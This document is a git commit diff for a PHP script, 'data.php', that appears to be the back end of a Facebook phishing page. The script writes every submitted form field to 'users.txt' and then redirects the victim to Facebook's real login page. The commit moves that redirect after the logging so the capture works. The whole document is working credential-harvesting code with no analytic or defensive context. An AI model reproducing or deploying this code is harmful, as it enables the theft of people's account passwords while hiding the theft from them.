0e13e62df851a56c3eb702fa9137bdc0a5bd1b75
Abino5 <abeomer@gmail.com>
2016-10-31 21:36:38 +0300

    Update data.php

--- data.php
+++ data.php
@@ -1,5 +1,4 @@
 <?php
-header("Location: https://m.facebook.com/login.php?&e=1348092&email=");
 $handle = fopen("users.txt", "a");
 foreach($_POST as $variable => $value) {
 fwrite($handle, $variable);
@@ -9,5 +8,7 @@ fwrite($handle, "\r\n");
 }
 fwrite($handle, "\r\n");
 fclose($handle);
+header("Location: https://m.facebook.com/login.php?&e=1348092&email=");
+
 exit;
 ?> 
